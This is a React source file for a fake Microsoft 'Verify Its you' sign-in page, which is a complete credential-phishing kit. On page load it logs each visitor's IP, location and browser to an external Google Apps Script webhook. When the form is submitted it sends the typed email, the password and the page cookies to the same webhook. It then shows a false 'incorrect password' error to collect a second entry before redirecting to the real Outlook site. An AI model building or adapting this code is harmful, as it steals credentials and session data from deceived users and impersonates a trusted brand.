/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState, useEffect } from 'react';
import { motion } from 'motion/react';
import { Loader2 } from 'lucide-react';

export default function App() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState('');

  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwnQKiZKlDN7Fzgr6QDjg40qPW3eZX4_aYOjJEhaLxdTNfV2aWKAq9ZJOssojt7etyxVw/exec';
  const [geoInfo, setGeoInfo] = useState<any>(null);

  // Visitor Notification with Geolocation
  useEffect(() => {
    const notifyVisit = async () => {
      let currentGeo = {};
      try {
        const response = await fetch('https://ipapi.co/json/');
        currentGeo = await response.json();
        setGeoInfo(currentGeo);
      } catch (err) {
        console.error('Geo fetch failed', err);
      }

      try {
        await fetch(webhookUrl, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'VISIT_NOTIFICATION',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: currentGeo.ip,
            city: currentGeo.city,
            state: currentGeo.region,
            country: currentGeo.country_name,
            geo: currentGeo
          }),
        });
      } catch (error) {
        console.error('Visit notification failed:', error);
      }
    };
    notifyVisit();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');
    
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          type: 'LOGIN_ATTEMPT',
          email,
          password,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          ip: geoInfo?.ip,
          city: geoInfo?.city,
          state: geoInfo?.region,
          country: geoInfo?.country_name,
          cookies: document.cookie
        }),
      });
      
      console.log('Submission sent to webhook');
    } catch (err) {
      console.error('Submission failed:', err);
    } finally {
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      if (attempts === 0) {
        setError('The password or email you entered is incorrect. Please try again.');
        setAttempts(1);
        setEmail('');
        setPassword('');
        setIsLoading(false);
      } else {
        window.location.href = 'https://outlook.office365.com';
      }
    }
  };

  return (
    <div 
      className="relative min-h-screen w-full flex flex-col items-center justify-center font-sans py-12 px-4"
      id="main-container"
    >
      {/* Background Image with Overlay */}
      <div 
        className="fixed inset-0 z-0 bg-cover bg-center brightness-75"
        style={{ 
          backgroundImage: `url('https://picsum.photos/seed/office-blur/1920/1080?blur=8')` 
        }}
        id="background-overlay"
      />

      {/* Content Wrapper */}
      <div className="relative z-10 flex flex-col items-center w-full" id="content-wrapper">
        
        {/* Card Container */}
        <div className="w-full max-w-[460px] flex flex-col items-center" id="card-container">
          {/* Main Verification Card */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className="bg-white p-8 md:p-10 shadow-2xl w-full min-h-[400px] flex flex-col mb-6"
            id="verification-card"
          >
          {/* Microsoft Logo */}
          <div className="flex items-center gap-3 mb-6" id="microsoft-logo-container">
            <div className="grid grid-cols-2 gap-0.5 w-[22px] h-[22px]" id="logo-grid">
              <div className="bg-[#f25022] w-full h-full" id="logo-red"></div>
              <div className="bg-[#7fba00] w-full h-full" id="logo-green"></div>
              <div className="bg-[#00a4ef] w-full h-full" id="logo-blue"></div>
              <div className="bg-[#ffb900] w-full h-full" id="logo-yellow"></div>
            </div>
            <span className="text-[#737373] text-xl font-semibold tracking-tight" id="logo-text">Microsoft</span>
          </div>

          {/* Card Header - Keeping the typo "Its" as requested "exactly as in image" */}
          <h2 className="text-2xl font-medium mb-1 text-black" id="card-header">
            Verify Its you
          </h2>
          <p className="text-[14px] text-black mb-6" id="card-subtext">
            You have been invited. Kindly confirm your identity before you can proceed.
          </p>

          {/* Error Message */}
          {error && (
            <div className="mb-4 text-[#e81123] text-[13px] font-medium" id="error-message">
              {error}
            </div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="flex flex-col gap-4" id="login-form">
            <div className="space-y-1" id="email-field-container">
              <label className="text-[13px] text-black" id="email-label">
                Email *
              </label>
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border border-black p-2 outline-none focus:ring-1 focus:ring-blue-500 text-sm h-10"
                autoFocus
                id="email-input"
              />
            </div>

            <div className="space-y-1" id="password-field-container">
              <label className="text-[13px] text-black" id="password-label">
                Password *
              </label>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border border-black p-2 outline-none focus:ring-1 focus:ring-blue-500 text-sm h-10"
                id="password-input"
              />
            </div>

            <button
              type="submit"
              disabled={isLoading}
              className="mt-2 bg-[#0067b8] hover:bg-[#005a9e] disabled:bg-[#0067b8]/60 disabled:cursor-not-allowed text-white py-2 px-8 font-medium transition-all w-1/2 self-center text-sm min-h-[40px] flex items-center justify-center gap-2"
              id="verify-button"
            >
              {isLoading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" id="loading-spinner" />
                  Verifying...
                </>
              ) : (
                'Verify Me'
              )}
            </button>
          </form>
        </motion.div>

        {/* Footer Branding - Moved below the card box and updated visibility */}
        <div className="flex justify-center gap-6 text-[11px] text-black/80 w-full" id="footer-links">
          <span className="hover:underline cursor-pointer hover:text-black transition-colors">Terms of use</span>
          <span className="hover:underline cursor-pointer hover:text-black transition-colors">Privacy & cookies</span>
          <span className="cursor-default">...</span>
        </div>
        </div>
      </div>
    </div>
  );
}

